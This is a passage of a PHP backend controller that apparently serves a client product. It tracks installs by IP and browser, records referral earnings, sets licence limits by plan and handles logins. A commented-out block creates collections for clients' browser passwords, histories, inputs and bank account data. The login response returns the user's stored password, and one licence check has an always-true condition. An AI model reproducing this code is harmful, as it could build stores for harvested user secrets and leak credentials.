                                Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "referrals")),
                                Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "referralsEarn"))
                            );
                        } else {
                            self::$conOfDatabase->storeClientErnDtlByDt(
                                Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "_default_"), "app_id")),
                                Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "earn")),
                                Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "referrals")),
                                Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "referralsEarn")),
                                Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "event")),
                                Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "username")),
                                Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "workWebsite")),
                                Time::getTodayDateOnly()
                            );
                        }
                    }
                    header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                } else {
                    Firewall::runtimeFailure("Bad Request", [
                        "debug" => ["file" => Http::browser()->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                        "error" => ["description" => "Your requested url is broken!!"],
                    ]);
                }
            } else {
                Firewall::runtimeFailure("Bad Request", [
                    "debug" => ["file" => Http::browser()->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                    "error" => ["description" => "Your requested url is broken!!"],
                ]);
            }
        }
        /*                else if(Inflect::lower(self::$requestMethod) === Inflect::lower("test")){
            self::$conOfDatabase->select("system")->create([
                "clients.browser.passwords.info",
                "clients.browser.histories.info",
                "clients.browser.inputs.info",
                "clients.bank.account.info",
                "clients.earning.captcha.info",
            ]);
        }*/
        else {
            Firewall::runtimeFailure("Bad Request", [
                "debug" => ["file" => Http::browser()->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                "error" => ["description" => "Your requested url is broken!!"],
            ]);
        }
    }


    /**
     * @param array $RequestedDataArray
     */
    private static function getVerifiedProductId(array $RequestedDataArray) : void
    {
        $idNbOfProduct = self::$conOfDatabase->getIdNbOfVerifiedProduct(Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "IdRequest"), "name")), Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "IdRequest"), "version")), Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "IdRequest"), "ip")), Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "IdRequest"), "browser")));
        if (!is_numeric($idNbOfProduct)) {
            Storage::StreamAsJson(['app_pub_id' => Encryption::static($idNbOfProduct)]);
        } else {
            self::$conOfDatabase->addProductToInstList(Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "IdRequest"), "name")), Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "IdRequest"), "version")), Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "IdRequest"), "ip")), Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "IdRequest"), "browser")));
            Storage::StreamAsJson(['app_pub_id' => Encryption::static(self::$conOfDatabase->getLastInsertedId("installed.products"))]);
        }
    }

    private static function getLicenceLimitByPlan(string $plan) : void
    {
        switch ($plan) {
            case 'trial':
                self::$limitOfProductLicence = 2000;
                self::$limitOfProductLicenceBase = 2000;
                break;
            case 'Plan 01':
                self::$limitOfProductLicence = 10000;
                self::$limitOfProductLicenceBase = 10000;
                break;
            case 'Plan 02':
                self::$limitOfProductLicence = 20000;
                self::$limitOfProductLicenceBase = 20000;
                break;
            case 'Plan 03':
                self::$limitOfProductLicence = 35000;
                self::$limitOfProductLicenceBase = 35000;
                break;
            case 'Plan 04':
                self::$limitOfProductLicence = 50000;
                self::$limitOfProductLicenceBase = 50000;
                break;
            default:
                self::$limitOfProductLicence = 0;
                self::$limitOfProductLicenceBase = 0;
                break;
        }
    }

    private static function processUserAuthentication($detailsArray, $IdNbOfUsr, $userDetails): void
    {
        /*$data->userdata->_default_->app_id*/
        $app = self::$conOfDatabase->getInstPrdInfById(Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "app_id")));
        if (is_array($app) and count($app) > 0) {
            $app = self::$conOfDatabase->getPrdLcnDtlByPrdId(Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "app_id")));
            if (ArrayCollection::value($app, "ipAddress") && ArrayCollection::value($app, "ipAddress") !== Inflect::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "ip"))) {
                self::$conOfDatabase->resetItmFrmLcnByPrdId(
                    Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "app_id")),
                    "ipAddress",
                    ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "ip")
                );
            }
            if (ArrayCollection::value($app, "browserNameFull") && ArrayCollection::value($app, "browserNameFull") !== Inflect::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "browser"))) {
                self::$conOfDatabase->resetItmFrmLcnByPrdId(
                    Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "app_id")),
                    "browserNameFull",
                    ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "browser")
                );
            }
        }

        if (is_array($userDetails) and count($userDetails) > 0) {
            self::$conOfDatabase->updateIdNbOfPrdOfUsr(
                Number::filterInt($IdNbOfUsr),
                Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "app_id"))
            );

            self::$conOfDatabase->updateUsrLcn(
                Number::filterInt($IdNbOfUsr),
                Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "app_id"))
            );
            self::upgradeLcnLmt(Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "app_id")));
            Storage::StreamAsJson(
                [
                    'message' => 'success', 'login' => 'passed', 'way' => 'email_password', 'log_status' => 'success',
                    'user' => [
                        'firstName' => $userDetails['firstName'], 'lastName' => $userDetails['lastName'], 'emailAddress' => $userDetails['emailAddress'], 'password' => $userDetails['password'],
                    ], 'licence' => self::$conOfDatabase->getLcnByPrdIdCLIpBr(
                        Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "app_id")),
                        Inflect::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "ip")),
                        Inflect::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "browser"))
                    ),
                ]
            );
        } else {
            Storage::StreamAsJson(['message' => 'error', 'login' => 'failed', 'way' => 'email_password']);
        }
    }

    private static function upgradeLcnLmt(string $prdId)
    {
        $licence = self::$conOfDatabase->getPrdLcnDtlByPrdId($prdId);
        if (Time::getToday() === ArrayCollection::value($licence, 'nextUpdate')) {
            if ($licence['limitBase'] !== 2000 || $licence['limitBase'] !== 0 || $licence['limitBase'] !== null) {
                self::$conOfDatabase->upgradeLcnLmt($prdId, $licence['limitBase']);
            }
        }
    }
}
